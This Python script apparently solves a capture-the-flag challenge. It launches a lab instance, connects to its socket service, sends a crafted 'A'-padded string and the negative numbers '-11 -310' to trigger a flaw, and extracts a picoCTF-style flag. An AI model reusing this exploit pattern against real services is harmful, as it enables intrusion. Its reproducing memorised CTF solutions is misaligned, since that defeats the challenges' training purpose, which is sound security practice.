import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/272/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/272/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
story = "A" * 20 + "%"
print("story:", story, "| somme:", sum(map(ord, story)))
s = socket.create_connection((host, port), timeout=15)
s.settimeout(8)
buf = b""
t0 = time.time()
while b">>" not in buf and time.time() - t0 < 5:
    try:
        c = s.recv(4096)
        if not c:
            break
        buf += c
    except socket.timeout:
        break
print("prompt:", buf.decode("latin-1", "replace")[:150])
s.sendall(story.encode() + b"\n")
time.sleep(0.4)
s.sendall(b"-11 -310\n")
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:600])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", m.group(0) if m else None)
